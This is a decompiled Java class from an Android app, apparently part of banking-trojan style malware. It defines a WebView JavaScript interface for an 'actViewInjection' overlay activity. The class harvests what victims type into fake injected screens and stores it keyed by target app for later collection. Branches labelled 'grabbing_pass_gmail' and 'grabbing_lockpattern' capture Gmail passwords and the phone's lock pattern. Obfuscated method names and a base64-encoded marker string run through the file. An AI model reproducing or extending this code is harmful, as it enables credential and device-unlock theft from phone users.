package com.example.mmm.Activity;

import android.content.*;
import org.json.*;
import com.example.mmm.Utils.*;
import android.os.*;
import android.webkit.*;

public class actViewInjection$WebAppInterface
{
    Context mContext;
    final actViewInjection theology$;
    
    actViewInjection$WebAppInterface(final actViewInjection theology$, final Context mContext) {
        this.theology$ = theology$;
        super();
        this.mContext = mContext;
    }
    
    @JavascriptInterface
    @JavascriptInterface
    public void _armenia(final String s) {
        if (!s.isEmpty()) {
            if (actViewInjection.a(this.theology$).isEmpty()) {
                actViewInjection.a(this.theology$, this.theology$.utl._storage(20));
            }
            final JSONObject jsonObject = new JSONObject();
            if (actViewInjection.b(this.theology$).equals("grabbing_pass_gmail")) {
                this.theology$.utl.SettingsWrite(this.mContext, "RE", "");
                actViewInjection.b(this.theology$, "com.google.android.gm");
            }
            if (actViewInjection.b(this.theology$).equals("grabbing_lockpattern")) {
                this.theology$.utl.SettingsWrite(this.mContext, "GE", "");
                actViewInjection.b(this.theology$, "grabbing_lockpattern");
                final String replace = s.replace(utils._efforts("LCJ0eXBlX2luamVjdHMiOiJwaW5jb2RlIiwiY2xvc2VkIjoiY2xvc2VfYWN0aXZpdHlfaW5qZWN0cyI="), "");
                final utils utl = this.theology$.utl;
                final Context mContext = this.mContext;
                final String s2 = "AS";
                final StringBuilder sb = new StringBuilder();
                sb.append("Lock Pattern: ");
                sb.append(replace);
                sb.append("[143523#]");
                utl.SettingsToAdd(mContext, s2, sb.toString());
            }
            else {
                jsonObject.put("application", (Object)actViewInjection.b(this.theology$));
                jsonObject.put("data", (Object)s);
                final utils utl2 = this.theology$.utl;
                final Context mContext2 = this.mContext;
                final String a = actViewInjection.a(this.theology$);
                final String string = jsonObject.toString();
                final String settingsRead = utl2.SettingsRead(mContext2, a);
                if (!settingsRead.isEmpty()) {
                    final JSONObject jsonObject2 = new JSONObject(settingsRead);
                    final JSONObject jsonObject3 = new JSONObject(string);
                    final String string2 = jsonObject2.getString("data");
                    final String string3 = jsonObject2.getString("data");
                    final String string4 = jsonObject3.getString("data");
                    utl2.Log("str_getParams", String.valueOf(string2));
                    utl2.Log("str_params", String.valueOf(string4));
                    final JSONObject mergeJSONObjects = utils.mergeJSONObjects(new JSONObject(string2), new JSONObject(string4));
                    final JSONObject jsonObject4 = new JSONObject();
                    jsonObject4.put("application", (Object)string3);
                    jsonObject4.put("data", (Object)mergeJSONObjects.toString());
                    utl2.Log("mergedJSON", jsonObject4.toString());
                    utl2.SettingsWrite(mContext2, a, jsonObject4.toString());
                }
                else {
                    utl2.SettingsWrite(mContext2, a, string);
                }
                if (!this.theology$.utl.SettingsRead(this.mContext, "AA").contains(actViewInjection.a(this.theology$))) {
                    final utils utl3 = this.theology$.utl;
                    final Context mContext3 = this.mContext;
                    final String s3 = "AA";
                    final StringBuilder sb2 = new StringBuilder();
                    sb2.append(actViewInjection.a(this.theology$));
                    sb2.append(":");
                    utl3.SettingsToAdd(mContext3, s3, sb2.toString());
                }
                this.theology$.utl._founded(this.mContext, "QP", actViewInjection.b(this.theology$));
            }
            if (s.contains("close_activity_injects")) {
                actViewInjection.c(this.theology$);
                this.theology$.facts$.removeAllViewsInLayout();
                this.theology$.facts$ = null;
                System.gc();
                if (Build$VERSION.SDK_INT > 20) {
                    this.theology$.finishAndRemoveTask();
                    return;
                }
                this.theology$.finish();
            }
        }
    }
}
